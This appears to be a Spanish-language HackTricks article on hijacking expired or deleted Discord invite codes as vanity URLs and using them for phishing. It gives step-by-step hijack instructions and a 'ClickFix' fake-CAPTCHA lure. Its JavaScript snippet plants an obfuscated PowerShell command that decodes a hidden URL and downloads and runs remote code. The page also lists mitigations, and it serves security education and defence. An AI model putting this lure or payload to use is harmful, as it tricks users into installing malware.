# Hijacking de invitaciones de Discord

{{#include ../../banners/hacktricks-training.md}}

El hijacking de invitaciones de Discord abusa de las reglas de reutilización de los enlaces vanity personalizados: un código de invitación temporal caducado, o un código permanente eliminado compuesto únicamente por letras minúsculas y dígitos, puede registrarse como enlace vanity en un servidor con Level 3 Boost. Un enlace vanity personalizado también puede quedar disponible cuando su servidor original pierde su Level 3 Boost; para una invitación temporal con letras mayúsculas, un atacante puede pre-registrar la forma vanity en minúsculas mientras la invitación normal sigue activa, pero la redirección comienza únicamente después de que dicha invitación caduque.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipos de invitación y riesgo de hijacking

El riesgo observado varía según el tipo de invitación:<sup>[[1]](#references)[[2]](#references)</sup>

| Tipo de invitación           | ¿Se puede secuestrar? | Condición / Comentarios                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Enlace de invitación temporal | ✅          | Después de caducar, el código queda disponible y puede volver a registrarse como una vanity URL mediante un servidor con Boost. |
| Enlace de invitación permanente | ⚠️          | Si se elimina y consta únicamente de letras minúsculas y dígitos, el código puede volver a estar disponible.        |
| Enlace vanity personalizado    | ✅          | Si el servidor original pierde su Level 3 Boost, su invitación vanity queda disponible para un nuevo registro.    |

## Pasos de explotación

1. Reconocimiento
- Monitoriza fuentes públicas (foros, redes sociales, canales de Telegram) en busca de enlaces de invitación que coincidan con el patrón `discord.gg/{code}` o `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Recopila códigos de invitación de interés (temporales o vanity).<sup>[[1]](#references)</sup>
2. Pre-registro
- Crea o utiliza un servidor de Discord existente con privilegios de Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- En **Server Settings → Vanity URL**, intenta asignar el código de invitación objetivo. Si se acepta, el código queda reservado por el servidor malicioso.<sup>[[1]](#references)</sup>
3. Activación del hijacking
- Para las invitaciones temporales, espera hasta que caduque la invitación original (o elimínala manualmente si controlas la fuente).<sup>[[1]](#references)</sup>
- Para los códigos que contienen letras mayúsculas, la variante en minúsculas puede reclamarse inmediatamente, aunque la redirección solo se activa después de la caducidad.<sup>[[1]](#references)</sup>
4. Redirección silenciosa
- Los usuarios que visiten el enlace antiguo serán enviados sin interrupciones al servidor controlado por el atacante una vez que el hijacking esté activo.<sup>[[1]](#references)</sup>

## Flujo de phishing mediante un servidor de Discord

1. Restringe los canales del servidor para que solo sea visible un canal **#verify**.<sup>[[1]](#references)</sup>
2. Implementa un bot (por ejemplo, **Safeguard#0786**) para solicitar a los recién llegados que verifiquen su identidad mediante OAuth2.<sup>[[1]](#references)</sup>
3. El bot redirige a los usuarios a un sitio de phishing (por ejemplo, `captchaguard.me`) bajo la apariencia de un CAPTCHA o un paso de verificación.<sup>[[1]](#references)</sup>
4. Implementa el truco de UX **ClickFix**:<sup>[[1]](#references)</sup>
- Muestra un mensaje de CAPTCHA defectuoso.
- Guía a los usuarios para abrir el cuadro de diálogo **Win+R**, pegar un comando de PowerShell precargado y pulsar Enter.

### Ejemplo de inyección en el portapapeles mediante ClickFix

La campaña utilizaba JavaScript para copiar un comando malicioso de PowerShell al portapapeles:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Este enfoque evita las descargas directas de archivos y aprovecha elementos familiares de la interfaz de usuario para reducir las sospechas del usuario.<sup>[[1]](#references)</sup>

## Mitigaciones

- Prioriza los enlaces de invitación permanentes y asegúrate de que el código contenga al menos una letra mayúscula; los códigos permanentes eliminados que contienen letras mayúsculas no pueden reutilizarse como vanity links.<sup>[[1]](#references)</sup>
- Rota periódicamente los códigos de invitación y revoca los enlaces antiguos.
- Supervisa el estado de boost del servidor de Discord y las solicitudes de vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Educa a los usuarios para que verifiquen la autenticidad del servidor y eviten ejecutar comandos pegados desde el portapapeles.

## References

- [1] [De la confianza a la amenaza: invitaciones de Discord secuestradas utilizadas para la distribución de malware en varias etapas](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Enlace de invitación personalizado – Soporte de Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
